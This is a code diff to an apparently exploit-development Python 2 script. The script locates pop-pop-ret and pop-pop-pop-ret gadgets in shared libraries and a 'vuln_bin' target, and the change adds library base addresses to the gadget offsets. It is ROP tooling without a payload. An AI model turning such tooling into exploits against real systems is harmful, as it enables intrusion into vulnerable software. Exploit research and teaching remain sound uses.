@@ -307,19 +307,28 @@ if __name__ == '__main__':
             if instr == None or ret == None:
                 print '%s library not present !' %(entry)
                 exit(1)
-            lib_list.append((instr, ret))
+
+            base_addr = find_lib_base_addr(entry)
+            if base_addr == None:
+                print 'Unable to get base address for library %s' %(entry)
+                exit(1)
+            lib_list.append((instr, ret, base_addr, entry))
 
     instr, ret = get_binary_instr(args.vuln_bin)
     if instr == None or ret == None:
         print '%s binary not present !' %(args.vuln_bin)
         exit(2)
-    lib_list.append((instr, ret))
+    lib_list.append((instr, ret, 0, args.vuln_bin))
    
     for entry in lib_list:
         print 'Found %d instructions with %d rets' %(len(entry[0]), len(entry[1]))
  
     pop_pop_ret_addr = None
     for entry in lib_list:
+        if len(entry) != 4:
+            print 'Inconsistent entry in library structure !'
+            exit(3)            
+
         instr = entry[0]
         ret = entry[1]
         
@@ -329,7 +338,7 @@ if __name__ == '__main__':
 
         result = find_2pop_ret(instr, ret)
         if result != None:
-            pop_pop_ret_addr = result
+            pop_pop_ret_addr = result + entry[2]
             break
 
     if pop_pop_ret_addr == None:
@@ -338,6 +347,10 @@ if __name__ == '__main__':
 
     pop_pop_pop_ret_addr = None
     for entry in lib_list:
+        if len(entry) != 4:
+            print 'Inconsistent entry in library structure !'
+            exit(4)
+
         instr = entry[0]
         ret = entry[1]
 
@@ -347,7 +360,7 @@ if __name__ == '__main__':
 
         result = find_3pop_ret(instr, ret)
         if result != None:
-            pop_pop_pop_ret_addr = result
+            pop_pop_pop_ret_addr = result + entry[2]
             break
 
     if pop_pop_pop_ret_addr == None:
